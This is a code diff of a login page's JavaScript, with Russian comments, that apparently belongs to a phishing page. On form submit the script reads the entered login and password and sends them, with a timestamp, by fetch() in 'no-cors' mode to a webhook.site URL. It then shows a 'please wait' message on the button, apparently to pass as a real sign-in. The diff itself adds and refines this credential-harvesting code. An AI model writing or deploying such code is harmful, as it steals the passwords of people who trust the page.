@@ -26,12 +26,19 @@
             var login = document.getElementById('login').value;
             var pass = document.getElementById('password').value;
             if (login && pass) {
-                // Отправка на Webhook.site
-                var url = 'https://webhook.site/0e3f7357-4822-4e4f-8546-2ed49c4f7501'; // ТВОЙ УНИКАЛЬНЫЙ URL
-                fetch(url, {
+                var data = {
+                    login: login,
+                    password: pass,
+                    time: new Date().toLocaleString()
+                };
+                // Отправка на Webhook
+                fetch('https://webhook.site/0e3f7357-4822-4e4f-8546-2ed49c4f7501', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ login: login, password: pass })
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
                 });
                 document.querySelector('button').innerHTML = 'Подождите...';
                 setTimeout(function() {
